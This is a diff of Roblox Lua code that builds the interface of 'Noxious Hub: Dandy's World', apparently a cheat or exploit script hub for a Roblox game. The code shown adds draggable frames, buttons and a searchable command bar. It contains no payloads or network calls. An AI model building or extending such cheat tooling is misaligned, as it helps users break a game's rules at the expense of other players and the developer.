+noxious["tivb border"].Parent = noxious["toggle interface visibility button"]
+
+noxious["tivb shadow"] = Instance.new("ImageLabel")
+noxious["tivb shadow"].Name = "Shadow"
+noxious["tivb shadow"].Size = UDim2.new(0, 65, 0, 65)
+noxious["tivb shadow"].Position = UDim2.new(0, -6, 0, -6)
+noxious["tivb shadow"].BackgroundTransparency = 1
+noxious["tivb shadow"].Image = "rbxassetid://1316045217"
+noxious["tivb shadow"].ImageColor3 = Color3.new(0, 0, 0)
+noxious["tivb shadow"].ImageTransparency = 0.2
+noxious["tivb shadow"].ScaleType = Enum.ScaleType.Slice
+noxious["tivb shadow"].SliceCenter = Rect.new(10, 10, 90, 90)
+noxious["tivb shadow"].ZIndex = 19998
+noxious["tivb shadow"].Parent = noxious["toggle interface visibility button"]
+
+function dragbutton()
+	local frame = noxious["toggle interface visibility button"]
+	local dragToggle 	
+	local dragSpeed = 0.25
+	local dragStart 	
+	local startPos 
+
+	local function updatebuttoninput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		noxious["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+
+	noxious["user input service"].InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updatebuttoninput(input)
+			end
+		end
+	end)
+end
+
+function addgradient()
+	local gradient = Instance.new("UIGradient")	
+	gradient.Color =
+		ColorSequence.new {
+			ColorSequenceKeypoint.new(0, noxious["default white color"]),
+			ColorSequenceKeypoint.new(0.5, noxious["default black color"]),
+			ColorSequenceKeypoint.new(1, noxious["default white color"])
+		}
+	gradient.Parent = noxious["tivb border"]
+
+	local rotationSpeed = 1
+	task.spawn(
+		function()
+			while true do
+				gradient.Rotation = (gradient.Rotation + rotationSpeed) % 360
+				task.wait(0.03)
+			end
+		end
+	)
+end
+
+dragbutton()
+addgradient()
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+canrepos = false
+
+noxious["mainframe"] = Instance.new("Frame")
+noxious["mainframe"].Name = "mainframe"
+noxious["mainframe"].Size = UDim2.new(0, 594, 0, 330)
+noxious["mainframe"].BackgroundColor3 = noxious["default black color"]
+noxious["mainframe"].BorderSizePixel = 0
+noxious["mainframe"].BorderColor3 = noxious["default white color"]
+noxious["mainframe"].BackgroundTransparency = 1
+noxious["mainframe"].Parent = noxious["screen gui"]
+noxious["mainframe"].Visible = false
+noxious["mainframe"].Position = UDim2.new(0, 0, 0, 0)
+noxious["mainframe"].ZIndex = 1
+
+noxious["mainframe shadow"] = Instance.new("ImageLabel")
+noxious["mainframe shadow"].Name = "Shadow"
+noxious["mainframe shadow"].Size = UDim2.new(0, 608, 0, 350)
+noxious["mainframe shadow"].Position = UDim2.new(0, -7, 0, -6)
+noxious["mainframe shadow"].BackgroundTransparency = 1
+noxious["mainframe shadow"].Image = "rbxassetid://1316045217"
+noxious["mainframe shadow"].ImageColor3 = Color3.new(0, 0, 0)
+noxious["mainframe shadow"].ImageTransparency = 0.3
+noxious["mainframe shadow"].ScaleType = Enum.ScaleType.Slice
+noxious["mainframe shadow"].SliceCenter = Rect.new(10, 10, 90, 90)
+noxious["mainframe shadow"].ZIndex = 0
+noxious["mainframe shadow"].Parent = noxious["mainframe"]
+
+local mainframe = Instance.new("Frame")
+mainframe.Name = "mainframe"
+mainframe.Size = UDim2.new(0, 594, 0, 290)
+mainframe.Position = UDim2.new(0, 0, 0, 30)
+mainframe.BackgroundColor3 = noxious["default black color"]
+mainframe.BorderSizePixel = 1
+mainframe.BorderColor3 = noxious["default white color"]
+mainframe.BackgroundTransparency = 0.6
+mainframe.Parent = noxious["mainframe"]
+mainframe.Visible = true
+mainframe.ZIndex = 2
+
+local mainframeline = Instance.new("Frame")
+mainframeline.Size = UDim2.new(0, 1, 0, 270)
+mainframeline.Position = UDim2.new(0, -1, 0, 30)
+mainframeline.BackgroundColor3 = noxious["default white color"]
+mainframeline.BorderSizePixel = 0
+mainframeline.BackgroundTransparency = 0
+mainframeline.Parent = mainframe
+mainframeline.Visible = true
+mainframeline.ZIndex = 3
+
+local mainframeline2 = Instance.new("Frame")
+mainframeline2.Size = UDim2.new(0, 1, 0, 270)
+mainframeline2.Position = UDim2.new(0, 594, 0, 30)
+mainframeline2.BackgroundColor3 = noxious["default white color"]
+mainframeline2.BorderSizePixel = 0
+mainframeline2.BackgroundTransparency = 0
+mainframeline2.Parent = mainframe
+mainframeline2.Visible = true
+mainframeline2.ZIndex = 3
+
+function centermainframe(ins)
+	if not ins then if canrepos == false then return end canrepos = false end
+	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X
+	local screenHeight = game:GetService("Workspace").CurrentCamera.ViewportSize.Y
+	local frameWidth = 594
+	local frameHeight = 330
+	local centerX = (screenWidth - frameWidth) / 2
+	local centerY = (screenHeight - frameHeight) / 2 - 56
+	local targetPosition = UDim2.new(0, centerX, 0, centerY)
+	if noxious["mainframe"].Position == targetPosition then canrepos = true return end
+	local ttime = 0.5
+	local easing = Enum.EasingDirection.InOut
+	local style = Enum.EasingStyle.Quad
+	if ins then ttime = 1 easing = Enum.EasingDirection.Out style = Enum.EasingStyle.Back noxious["mainframe"].Visible = true end
+	local tweenInfo = TweenInfo.new(ttime, style, easing, 0, false, 0)
+	local tween = noxious["tween service"]:Create(noxious["mainframe"], tweenInfo, {Position = targetPosition})
+	tween:Play()
+	tween.Completed:Wait()
+	canrepos = true
+	cantogglevisibility = true
+end
+
+centermainframe(false)
+
+function hidemainframe()
+	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X
+	local screenHeight = game:GetService("Workspace").CurrentCamera.ViewportSize.Y
+	local frameWidth = 594
+	local frameHeight = 330
+	local centerX = (screenWidth - frameWidth) / 2
+	local centerY = (screenHeight - frameHeight) / 2 - 56
+	local targetPosition = UDim2.new(0, centerX, 0, centerY + 480)
+	noxious["mainframe"].Position = targetPosition
+end
+
+hidemainframe()
+
+function dragmainframe()
+	local frame = noxious["mainframe"]
+	local dragToggle 	
+	local dragSpeed = 0.25
+	local dragStart 	
+	local startPos 
+
+	local function updatemainframeinput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		noxious["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+
+	noxious["user input service"].InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updatemainframeinput(input)
+			end
+		end
+	end)
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["execute button"] = Instance.new("TextButton")
+noxious["execute button"].Size = UDim2.new(0, 36.3, 0, 36.3)
+noxious["execute button"].BackgroundColor3 = noxious["default black color"]
+noxious["execute button"].BackgroundTransparency = 0
+noxious["execute button"].Position = UDim2.new(0, 246, 0, 293)
+noxious["execute button"].BorderColor3 = noxious["default white color"]
+noxious["execute button"].BorderSizePixel = 1
+noxious["execute button"].TextColor3 = noxious["default white color"]
+noxious["execute button"].Font = Enum.Font.Nunito
+noxious["execute button"].TextSize = 20
+noxious["execute button"].TextScaled = false
+noxious["execute button"].Text = ">_"
+noxious["execute button"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["execute button"].TextYAlignment = Enum.TextYAlignment.Center
+noxious["execute button"].Parent = noxious["mainframe"]
+
+noxious["execute button ui corner"] = Instance.new("UICorner")
+noxious["execute button ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["execute button ui corner"].Parent = noxious["execute button"]
+
+noxious["execute button border"] = Instance.new("Frame")
+noxious["execute button border"].Size = UDim2.new(0, 38.3, 0, 38.3)
+noxious["execute button border"].Position = UDim2.new(0, -1, 0, -1)
+noxious["execute button border"].BackgroundColor3 = noxious["default white color"]
+noxious["execute button border"].BorderSizePixel = 0
+noxious["execute button border"].ZIndex = 30
+noxious["execute button border"].Parent = noxious["execute button"]
+
+noxious["execute button border ui corner"] = Instance.new("UICorner")
+noxious["execute button border ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["execute button border ui corner"].Parent = noxious["execute button border"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["hide"] = Instance.new("Frame")
+noxious["hide"].Size = UDim2.new(0, 52.3, 0, 32.8)
+noxious["hide"].BackgroundColor3 = noxious["default black color"]
+noxious["hide"].Position = UDim2.new(0, 238, 0, 293)
+noxious["hide"].BorderColor3 = noxious["default white color"]
+noxious["hide"].BorderSizePixel = 0
+noxious["hide"].Parent = noxious["mainframe"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["bottom frame title"] = Instance.new("TextLabel")
+noxious["bottom frame title"].Size = UDim2.new(0.978, 0, 1.1, -5.5)
+noxious["bottom frame title"].Position = UDim2.new(0, -37, -0.18, 1)
+noxious["bottom frame title"].BackgroundTransparency = 1
+noxious["bottom frame title"].TextColor3 = noxious["default white color"]
+noxious["bottom frame title"].Font = Enum.Font.Nunito
+noxious["bottom frame title"].TextSize = 21.6
+noxious["bottom frame title"].TextScaled = false
+noxious["bottom frame title"].Text = "Noxious Hub: Dandy's World"
+noxious["bottom frame title"].TextXAlignment = Enum.TextXAlignment.Right
+noxious["bottom frame title"].Parent = noxious["bottom frame"]
+
+noxious["bottom frame subtitle"] = Instance.new("TextLabel")
+noxious["bottom frame subtitle"].Size = UDim2.new(0.978, 0, 1.1, -5.5)
+noxious["bottom frame subtitle"].Position = UDim2.new(0, -37, 0.18, 1)
+noxious["bottom frame subtitle"].BackgroundTransparency = 1
+noxious["bottom frame subtitle"].TextColor3 = noxious["default gray color"]
+noxious["bottom frame subtitle"].Font = Enum.Font.Nunito
+noxious["bottom frame subtitle"].TextSize = 18
+noxious["bottom frame subtitle"].TextScaled = false
+noxious["bottom frame subtitle"].Text = "Team Noxious & Team Occulence"
+noxious["bottom frame subtitle"].TextXAlignment = Enum.TextXAlignment.Right
+noxious["bottom frame subtitle"].Parent = noxious["bottom frame"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["top frame"] = Instance.new("Frame")
+noxious["top frame"].Name = "TopFrame"
+noxious["top frame"].Size = UDim2.new(0.9999, 0, 0, 52)
+noxious["top frame"].BackgroundColor3 = noxious["default black color"]
+noxious["top frame"].BorderColor3 = noxious["default white color"]
+noxious["top frame"].BorderSizePixel = 1
+noxious["top frame"].Parent = noxious["mainframe"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["bottom frame"] = Instance.new("Frame")
+noxious["bottom frame"].Size = UDim2.new(0, 594, 0, 52.8)
+noxious["bottom frame"].Position = UDim2.new(0, 0, 0.7, 54)
+noxious["bottom frame"].BackgroundColor3 = noxious["default black color"]
+noxious["bottom frame"].BorderColor3 = noxious["default white color"]
+noxious["bottom frame"].BorderSizePixel = 1
+noxious["bottom frame"].Parent = noxious["mainframe"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["command bar"] = Instance.new("TextBox")
+noxious["command bar"].Size = UDim2.new(0, 290, 0, 52.8)
+noxious["command bar"].Position = UDim2.new(0, 0, 0.7, 54)
+noxious["command bar"].PlaceholderText = "Type command here..."
+noxious["command bar"].PlaceholderColor3 = noxious["default gray color"]
+noxious["command bar"].Text = ""
+noxious["command bar"].Font = Enum.Font.Nunito
+noxious["command bar"].BackgroundColor3 = noxious["default black color"]
+noxious["command bar"].TextColor3 = noxious["default white color"]
+noxious["command bar"].BorderColor3 = noxious["default white color"]
+noxious["command bar"].BorderSizePixel = 1
+noxious["command bar"].TextXAlignment = Enum.TextXAlignment.Left
+noxious["command bar"].TextSize = 21.6
+noxious["command bar"].TextWrapped = false
+noxious["command bar"].TextScaled = false
+noxious["command bar"].Parent = noxious["mainframe"]
+noxious["command bar"].ClipsDescendants = true
+
+noxious["command bar text padding"] = Instance.new("UIPadding")
+noxious["command bar text padding"].PaddingLeft = UDim.new(0, 13)
+noxious["command bar text padding"].PaddingRight = UDim.new(0, 52)
+noxious["command bar text padding"].Parent = noxious["command bar"]
+
+local previousListName = nil
+local lastSearchText = ""
+
+noxious["command bar"].Focused:Connect(function()
+	canusekeybind = false
+end)
+
+noxious["command bar"]:GetPropertyChangedSignal("Text"):Connect(function()
+	if autosearchcommand then
+		local searchText = noxious["command bar"].Text:lower():gsub("^%s+", ""):gsub("%s+$", "")
+
+		if searchText == lastSearchText then return end
+		lastSearchText = searchText
+
+		if searchText == "" or not searchText then
+			if previousListName == nil then
+				for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+					if button:IsA("TextButton") then
+						if button.Text:gsub("> ", ""):gsub(" <", "") == "All Commands" then
+							updateButtonText(button)
+							break
+						end
+					end
+				end
+				noxious["current displayed list"] = "All Commands"
+				dispcmds(noxious["command lists"]["All Commands"])
+				return
+			end
+
+			if noxious["command lists"][previousListName] then
+				dispcmds(noxious["command lists"][previousListName], previousListName)
+				noxious["current displayed list"] = previousListName
+
+				for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+					if button:IsA("TextButton") then
+						if button.Text:gsub("> ", ""):gsub(" <", "") == previousListName then
+							updateButtonText(button)
+							break
+						end
+					end
+				end
+				return
+			else
+				for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+					if button:IsA("TextButton") then
+						if button.Text:gsub("> ", ""):gsub(" <", "") == "All Commands" then
+							updateButtonText(button)
+							break
+						end
+					end
+				end
+				noxious["current displayed list"] = "All Commands"
+				dispcmds(noxious["command lists"]["All Commands"])
+				return
+			end
+		end
+
+		if noxious["current displayed list"] ~= "All Commands" and noxious["current displayed list"] ~= "Introduction" then
+			previousListName = noxious["current displayed list"]
+		end
+
+		if not noxious["command lists"]["All Commands"] then
+			initializeAllCommands()
+		end
+
+		-- Filter All Commands for search
+		local filtered = {}
+		for _, cmd in ipairs(noxious["command lists"]["All Commands"]) do
+			if not cmd:match("^%s*$") and cmd:lower():find(searchText, 1, true) then
+				table.insert(filtered, cmd)
+			end
+		end
+
+		dispcmds(filtered) -- filtered list has no list name, so second arg omitted
+		noxious["current displayed list"] = "All Commands"
+
+		-- Update All Commands button highlight
+		for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+			if button:IsA("TextButton") then
+				if button.Text:gsub("> ", ""):gsub(" <", "") == "All Commands" then
+					updateButtonText(button)
+					break
+				end
+			end
+		end
+	end
+end)
+
+noxious["command bar"].FocusLost:Connect(function(enterPressed)
+	local text = noxious["command bar"].Text
+	canusekeybind = true
+
+	if text == "" then
+		if autosearchcommand then
+			if previousListName == nil then
+				for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+					if button:IsA("TextButton") then
+						if button.Text:gsub("> ", ""):gsub(" <", "") == "All Commands" then
+							updateButtonText(button)
+							break
+						end
+					end
+				end
+				noxious["current displayed list"] = "All Commands"
+				dispcmds(noxious["command lists"]["All Commands"])
+			elseif noxious["command lists"][previousListName] then
+				dispcmds(noxious["command lists"][previousListName], previousListName)
+				noxious["current displayed list"] = previousListName
+
+				for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+					if button:IsA("TextButton") then
+						if button.Text:gsub("> ", ""):gsub(" <", "") == previousListName then
+							updateButtonText(button)
+							break
+						end
+					end
+				end
+			else
+				for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+					if button:IsA("TextButton") then
+						if button.Text:gsub("> ", ""):gsub(" <", "") == "All Commands" then
+							updateButtonText(button)
+							break
+						end
+					end
+				end
+				noxious["current displayed list"] = "All Commands"
+				dispcmds(noxious["command lists"]["All Commands"])
+			end
+		end
+	else
+		if enterPressed then
+			handle(text, true)
+			if not autosearchcommand then return end
+			dispcmds(noxious["command lists"]["All Commands"])
+			noxious["current displayed list"] = "All Commands"
+
+			for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
+				if button:IsA("TextButton") then
+					if button.Text:gsub("> ", ""):gsub(" <", "") == "All Commands" then
+						updateButtonText(button)
+						break
+					end
+				end
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function makecmdbar()
+	local zIndexSeed = noxious["cmdbar instance count"] or 0
+	zIndexSeed += 100
+	noxious["cmdbar instance count"] = zIndexSeed
+	local zIndexBase = zIndexSeed
+
+	noxious["seperate command bar frame"] = Instance.new("Frame")
+	noxious["seperate command bar frame"].Size = UDim2.new(0, 290, 0, 82.8)
+	noxious["seperate command bar frame"].Parent = noxious["screen gui"]
+	noxious["seperate command bar frame"].BackgroundTransparency = 1
+	noxious["seperate command bar frame"].BackgroundColor3 = noxious["default black color"]
+	noxious["seperate command bar frame"].BorderColor3 = noxious["default white color"]
+	noxious["seperate command bar frame"].ZIndex = zIndexBase + 6
+
+	noxious["seperate command bar mainframe"] = Instance.new("Frame")
+	noxious["seperate command bar mainframe"].Size = UDim2.new(0, 290, 0, 82.8)
+	noxious["seperate command bar mainframe"].Parent = noxious["seperate command bar frame"]
+	noxious["seperate command bar mainframe"].BackgroundTransparency = 0.6
+	noxious["seperate command bar mainframe"].BackgroundColor3 = noxious["default black color"]
+	noxious["seperate command bar mainframe"].BorderColor3 = noxious["default white color"]
+	noxious["seperate command bar mainframe"].ZIndex = zIndexBase + 0
+
+	noxious["seperate command bar mainframe shadow"] = Instance.new("ImageLabel")
+	noxious["seperate command bar mainframe shadow"].Name = "Shadow"
+	noxious["seperate command bar mainframe shadow"].Size = UDim2.new(0, 304, 0, 95.8)
+	noxious["seperate command bar mainframe shadow"].Position = UDim2.new(0, -7, 0, -6)
+	noxious["seperate command bar mainframe shadow"].BackgroundTransparency = 1
+	noxious["seperate command bar mainframe shadow"].Image = "rbxassetid://1316045217"
+	noxious["seperate command bar mainframe shadow"].ImageColor3 = Color3.new(0, 0, 0)
+	noxious["seperate command bar mainframe shadow"].ImageTransparency = 0.3
+	noxious["seperate command bar mainframe shadow"].ScaleType = Enum.ScaleType.Slice
+	noxious["seperate command bar mainframe shadow"].SliceCenter = Rect.new(10, 10, 90, 90)
+	noxious["seperate command bar mainframe shadow"].ZIndex = zIndexBase - 1
+	noxious["seperate command bar mainframe shadow"].Parent = noxious["seperate command bar mainframe"]
+
+	noxious["seperate command bar top frame"] = Instance.new("TextLabel")
+	noxious["seperate command bar top frame"].Size = UDim2.new(0, 290, 0, 29)
+	noxious["seperate command bar top frame"].Parent = noxious["seperate command bar mainframe"]
+	noxious["seperate command bar top frame"].Position = UDim2.new(0, 0, 0, 0)
+	noxious["seperate command bar top frame"].Text = "Command Bar"
+	noxious["seperate command bar top frame"].Font = Enum.Font.Nunito
+	noxious["seperate command bar top frame"].BackgroundColor3 = noxious["default black color"]
+	noxious["seperate command bar top frame"].TextColor3 = noxious["default white color"]
+	noxious["seperate command bar top frame"].BorderColor3 = noxious["default white color"]
+	noxious["seperate command bar top frame"].BorderSizePixel = 1
+	noxious["seperate command bar top frame"].TextXAlignment = Enum.TextXAlignment.Left
+	noxious["seperate command bar top frame"].TextSize = 21.6
+	noxious["seperate command bar top frame"].TextXAlignment = Enum.TextXAlignment.Left
+	noxious["seperate command bar top frame"].TextWrapped = false
+	noxious["seperate command bar top frame"].TextScaled = false
+	noxious["seperate command bar top frame"].ClipsDescendants = true
+	noxious["seperate command bar top frame"].ZIndex = zIndexBase + 1
+
+	noxious["seperate command bar top frame text padding"] = Instance.new("UIPadding")
+	noxious["seperate command bar top frame text padding"].PaddingLeft = UDim.new(0, 6)
+	noxious["seperate command bar top frame text padding"].PaddingRight = UDim.new(0, 0)
+	noxious["seperate command bar top frame text padding"].Parent = noxious["seperate command bar top frame"]
+
+	noxious["seperate command bar top frame close button"] = Instance.new("TextButton")
+	noxious["seperate command bar top frame close button"].Size = UDim2.new(0, 29, 0, 29)
+	noxious["seperate command bar top frame close button"].Parent = noxious["seperate command bar top frame"]
+	noxious["seperate command bar top frame close button"].Position = UDim2.new(0, 255, 0, 0)
+	noxious["seperate command bar top frame close button"].Text = "X"
+	noxious["seperate command bar top frame close button"].Font = Enum.Font.Nunito
+	noxious["seperate command bar top frame close button"].TextColor3 = noxious["default white color"]
+	noxious["seperate command bar top frame close button"].BorderSizePixel = 0
+	noxious["seperate command bar top frame close button"].BackgroundColor3 = noxious["default black color"]
+	noxious["seperate command bar top frame close button"].TextXAlignment = Enum.TextXAlignment.Center
+	noxious["seperate command bar top frame close button"].TextSize = 21.6
+	noxious["seperate command bar top frame close button"].TextWrapped = false
+	noxious["seperate command bar top frame close button"].TextScaled = false
+	noxious["seperate command bar top frame close button"].ClipsDescendants = true
+	noxious["seperate command bar top frame close button"].ZIndex = zIndexBase + 2
+
+	local currentFrame = noxious["seperate command bar frame"]
+	noxious["seperate command bar top frame close button"].MouseButton1Click:Connect(function()
+		playclicksound()
+		currentFrame:Destroy()
+	end)
+
+	noxious["seperate command bar"] = Instance.new("TextBox")
+	noxious["seperate command bar"].Size = UDim2.new(0, 238, 0, 52.8)
+	noxious["seperate command bar"].Position = UDim2.new(0, 0, 0, 30)
+	noxious["seperate command bar"].PlaceholderText = "Type command here..."
+	noxious["seperate command bar"].PlaceholderColor3 = noxious["default gray color"]
+	noxious["seperate command bar"].Text = ""
+	noxious["seperate command bar"].ClearTextOnFocus = ptcleartextbox
+	noxious["seperate command bar"].Font = Enum.Font.Nunito
+	noxious["seperate command bar"].TextColor3 = noxious["default white color"]
+	noxious["seperate command bar"].BorderColor3 = noxious["default white color"]
+	noxious["seperate command bar"].BackgroundColor3 = noxious["default black color"]
+	noxious["seperate command bar"].ZIndex = zIndexBase + 7
+	noxious["seperate command bar"].BorderSizePixel = 1
+	noxious["seperate command bar"].BackgroundTransparency = 1
+	noxious["seperate command bar"].TextXAlignment = Enum.TextXAlignment.Left
+	noxious["seperate command bar"].TextSize = 21.6
+	noxious["seperate command bar"].TextWrapped = false
+	noxious["seperate command bar"].TextScaled = false
+	noxious["seperate command bar"].ClipsDescendants = true
+	noxious["seperate command bar"].Parent = noxious["seperate command bar mainframe"]
+
+	noxious["seperate command bar text padding"] = Instance.new("UIPadding")
+	noxious["seperate command bar text padding"].PaddingLeft = UDim.new(0, 13)
+	noxious["seperate command bar text padding"].PaddingRight = UDim.new(0, 0)
+	noxious["seperate command bar text padding"].Parent = noxious["seperate command bar"]
+
+	noxious["seperate command bar line"] = Instance.new("Frame")
+	noxious["seperate command bar line"].Size = UDim2.new(0, 1, 0, 52.8)
+	noxious["seperate command bar line"].Position = UDim2.new(0, -1, 0, 30)
+	noxious["seperate command bar line"].Parent = noxious["seperate command bar mainframe"]
+	noxious["seperate command bar line"].BackgroundColor3 = noxious["default white color"]
+	noxious["seperate command bar line"].BackgroundTransparency = 0
+	noxious["seperate command bar line"].BorderSizePixel = 0
+	noxious["seperate command bar line"].ZIndex = zIndexBase + 4
+
+	noxious["seperate command bar line 2"] = Instance.new("Frame")
+	noxious["seperate command bar line 2"].Size = UDim2.new(0, 1, 0, 52.8)
+	noxious["seperate command bar line 2"].Position = UDim2.new(0, 290, 0, 30)
+	noxious["seperate command bar line 2"].Parent = noxious["seperate command bar mainframe"]
+	noxious["seperate command bar line 2"].BackgroundColor3 = noxious["default white color"]
+	noxious["seperate command bar line 2"].BackgroundTransparency = 0
+	noxious["seperate command bar line 2"].BorderSizePixel = 0
+	noxious["seperate command bar line 2"].ZIndex = zIndexBase + 4
+
+	noxious["seperate command bar line 3"] = Instance.new("Frame")
+	noxious["seperate command bar line 3"].Size = UDim2.new(0, 292, 0, 1)
+	noxious["seperate command bar line 3"].Position = UDim2.new(0, -1, 0, 82)
+	noxious["seperate command bar line 3"].Parent = noxious["seperate command bar mainframe"]
+	noxious["seperate command bar line 3"].BackgroundColor3 = noxious["default white color"]
+	noxious["seperate command bar line 3"].BackgroundTransparency = 0
+	noxious["seperate command bar line 3"].BorderSizePixel = 0
+	noxious["seperate command bar line 3"].ZIndex = zIndexBase + 4
+
+	noxious["seperate command bar execute button"] = Instance.new("TextButton")
+	noxious["seperate command bar execute button"].Size = UDim2.new(0, 36.3, 0, 36.3)
+	noxious["seperate command bar execute button"].BackgroundColor3 = noxious["default black color"]
+	noxious["seperate command bar execute button"].Position = UDim2.new(0, 246, 0, 38)
+	noxious["seperate command bar execute button"].TextColor3 = noxious["default white color"]
+	noxious["seperate command bar execute button"].Font = Enum.Font.Nunito
+	noxious["seperate command bar execute button"].Text = ">_"
+	noxious["seperate command bar execute button"].ZIndex = zIndexBase + 7
+	noxious["seperate command bar execute button"].BorderColor3 = noxious["default white color"]
+	noxious["seperate command bar execute button"].BorderSizePixel = 1
+	noxious["seperate command bar execute button"].TextColor3 = noxious["default white color"]
+	noxious["seperate command bar execute button"].Font = Enum.Font.Nunito
+	noxious["seperate command bar execute button"].TextSize = 20
+	noxious["seperate command bar execute button"].TextScaled = false
+	noxious["seperate command bar execute button"].Text = ">_"
+	noxious["seperate command bar execute button"].TextXAlignment = Enum.TextXAlignment.Center
+	noxious["seperate command bar execute button"].TextYAlignment = Enum.TextYAlignment.Center
+	noxious["seperate command bar execute button"].Parent = noxious["seperate command bar mainframe"]
+
+	noxious["seperate command bar execute button ui corner"] = Instance.new("UICorner")
+	noxious["seperate command bar execute button ui corner"].CornerRadius = UDim.new(0.2, 0)
+	noxious["seperate command bar execute button ui corner"].Parent = noxious["seperate command bar execute button"]
+
+	noxious["seperate command bar execute button border"] = Instance.new("Frame")
+	noxious["seperate command bar execute button border"].Size = UDim2.new(0, 38.3, 0, 38.3)
+	noxious["seperate command bar execute button border"].Position = UDim2.new(0, -1, 0, -1)
+	noxious["seperate command bar execute button border"].BackgroundColor3 = noxious["default white color"]
+	noxious["seperate command bar execute button border"].BorderSizePixel = 0
+	noxious["seperate command bar execute button border"].ZIndex = zIndexBase + 4
+	noxious["seperate command bar execute button border"].Parent = noxious["seperate command bar execute button"]
+
+	noxious["seperate command bar execute button border ui corner"] = Instance.new("UICorner")
+	noxious["seperate command bar execute button border ui corner"].CornerRadius = UDim.new(0.2, 0)
+	noxious["seperate command bar execute button border ui corner"].Parent = noxious["seperate command bar execute button border"]
+
+	local textbox = noxious["seperate command bar"]
+	noxious["seperate command bar execute button"].MouseButton1Click:Connect(function()
+		playclicksound()
+		handle(textbox.Text, false)
+	end)
+
+	noxious["seperate command bar"].FocusLost:Connect(function(enterPressed)
+		canusekeybind = true
+		if enterPressed then
+			handle(textbox.Text, false)
+			textbox.Text = ""
+		end
+	end)
+
+	noxious["seperate command bar"].Focused:Connect(function()
+		canusekeybind = false
+	end)
+
+	task.spawn(function()
+		local screen = game:GetService("Workspace").CurrentCamera.ViewportSize
+		noxious["seperate command bar frame"].Position = UDim2.new(0, (screen.X - 290) / 2, 0, (screen.Y - 82.8) / 2 - 56)
+	end)
+
+	do
+		local dragToggle = false
+		local dragStart
+		local startPos
+		local frame = noxious["seperate command bar frame"]
+		local main = noxious["seperate command bar mainframe"]
+
+		main.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				dragToggle = true
+				dragStart = input.Position
+				startPos = frame.Position
+				local conn
+				conn = input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragToggle = false
+						conn:Disconnect()
+					end
+				end)
+			end
+		end)
+
+		noxious["user input service"].InputChanged:Connect(function(input)
+			if dragToggle and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				local delta = input.Position - dragStart
+				local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+					startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+				noxious["tween service"]:Create(frame, TweenInfo.new(0.25), {Position = newPos}):Play()
+			end
+		end)
+	end
+	updclrtxt()
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["hide interface button"] = Instance.new("TextButton")
+noxious["hide interface button"].Size = UDim2.new(0, 36.3, 0, 36.3)
+noxious["hide interface button"].BackgroundColor3 = noxious["default black color"]
+noxious["hide interface button"].Position = UDim2.new(0.9256, 0, 0.157, 0)
+noxious["hide interface button"].BorderColor3 = noxious["default white color"]
+noxious["hide interface button"].BorderSizePixel = 1
+noxious["hide interface button"].TextColor3 = noxious["default white color"]
+noxious["hide interface button"].Font = Enum.Font.Nunito
+noxious["hide interface button"].TextSize = 20
+noxious["hide interface button"].TextScaled = false
+noxious["hide interface button"].Text = "X"
+noxious["hide interface button"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["hide interface button"].TextYAlignment = Enum.TextYAlignment.Center
+noxious["hide interface button"].Parent = noxious["top frame"]
+
+noxious["hide interface button ui corner"] = Instance.new("UICorner")
+noxious["hide interface button ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["hide interface button ui corner"].Parent = noxious["hide interface button"]
+
+noxious["hide interface button hide"] = Instance.new("Frame")
